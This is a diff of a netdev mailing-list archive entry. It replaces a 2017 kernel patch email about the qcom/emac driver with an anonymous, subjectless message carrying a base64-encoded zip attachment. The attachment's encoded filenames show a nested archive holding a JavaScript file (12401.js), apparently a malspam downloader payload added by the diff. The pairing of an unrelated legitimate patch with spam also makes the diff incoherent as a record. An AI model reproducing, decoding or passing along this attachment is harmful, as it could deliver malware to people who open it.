@@ -1,70 +1,68 @@
-From: Timur Tabi <timur@codeaurora.org>
-Subject: [PATCH 2/4] net: qcom/emac: remove unused address arrays
-Date: Wed, 11 Oct 2017 14:52:24 -0500
-Message-ID: <1507751546-10265-3-git-send-email-timur@codeaurora.org>
-References: <1507751546-10265-1-git-send-email-timur@codeaurora.org>
-Cc: timur@codeaurora.org
-To: "David S. Miller" <davem@davemloft.net>, netdev@vger.kernel.org
+From: <kindergartenchaos2@gmail.com>
+Subject: (unknown)
+Date: Wed, 11 Oct 2017 19:55:02 -0000
+Message-ID: <150775170262.31215.17511391057348907174@alandick.ro>
+Mime-Version: 1.0
+Content-Type: application/zip; name="150646856.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from smtp.codeaurora.org ([198.145.29.96]:37624 "EHLO
-        smtp.codeaurora.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752691AbdJKTwc (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Wed, 11 Oct 2017 15:52:32 -0400
-In-Reply-To: <1507751546-10265-1-git-send-email-timur@codeaurora.org>
+Received: from mx.alandick.ro ([46.97.229.107]:42543 "HELO alandick.ro"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752295AbdJKTzP (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 11 Oct 2017 15:55:15 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-The EMAC is capable of multiple TX and RX rings, but the driver only
-supports one ring for each.  One function had some left-over unused
-code that supports multiple rings, but all it did was make the code
-harder to read.
-
-Signed-off-by: Timur Tabi <timur@codeaurora.org>
----
- drivers/net/ethernet/qualcomm/emac/emac-mac.c | 16 +++-------------
- 1 file changed, 3 insertions(+), 13 deletions(-)
-
-diff --git a/drivers/net/ethernet/qualcomm/emac/emac-mac.c b/drivers/net/ethernet/qualcomm/emac/emac-mac.c
-index 3ed9033e56db..9cbb27263742 100644
---- a/drivers/net/ethernet/qualcomm/emac/emac-mac.c
-+++ b/drivers/net/ethernet/qualcomm/emac/emac-mac.c
-@@ -309,22 +309,12 @@ void emac_mac_mode_config(struct emac_adapter *adpt)
- /* Config descriptor rings */
- static void emac_mac_dma_rings_config(struct emac_adapter *adpt)
- {
--	static const unsigned short tpd_q_offset[] = {
--		EMAC_DESC_CTRL_8,        EMAC_H1TPD_BASE_ADDR_LO,
--		EMAC_H2TPD_BASE_ADDR_LO, EMAC_H3TPD_BASE_ADDR_LO};
--	static const unsigned short rfd_q_offset[] = {
--		EMAC_DESC_CTRL_2,        EMAC_DESC_CTRL_10,
--		EMAC_DESC_CTRL_12,       EMAC_DESC_CTRL_13};
--	static const unsigned short rrd_q_offset[] = {
--		EMAC_DESC_CTRL_5,        EMAC_DESC_CTRL_14,
--		EMAC_DESC_CTRL_15,       EMAC_DESC_CTRL_16};
--
- 	/* TPD (Transmit Packet Descriptor) */
- 	writel(upper_32_bits(adpt->tx_q.tpd.dma_addr),
- 	       adpt->base + EMAC_DESC_CTRL_1);
- 
- 	writel(lower_32_bits(adpt->tx_q.tpd.dma_addr),
--	       adpt->base + tpd_q_offset[0]);
-+	       adpt->base + EMAC_DESC_CTRL_8);
- 
- 	writel(adpt->tx_q.tpd.count & TPD_RING_SIZE_BMSK,
- 	       adpt->base + EMAC_DESC_CTRL_9);
-@@ -334,9 +324,9 @@ static void emac_mac_dma_rings_config(struct emac_adapter *adpt)
- 	       adpt->base + EMAC_DESC_CTRL_0);
- 
- 	writel(lower_32_bits(adpt->rx_q.rfd.dma_addr),
--	       adpt->base + rfd_q_offset[0]);
-+	       adpt->base + EMAC_DESC_CTRL_2);
- 	writel(lower_32_bits(adpt->rx_q.rrd.dma_addr),
--	       adpt->base + rrd_q_offset[0]);
-+	       adpt->base + EMAC_DESC_CTRL_5);
- 
- 	writel(adpt->rx_q.rfd.count & RFD_RING_SIZE_BMSK,
- 	       adpt->base + EMAC_DESC_CTRL_3);
--- 
-Qualcomm Datacenter Technologies, Inc. as an affiliate of Qualcomm
-Technologies, Inc.  Qualcomm Technologies, Inc. is a member of the
-Code Aurora Forum, a Linux Foundation Collaborative Project.
+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
+AQBbAAAAhAoAAAAA
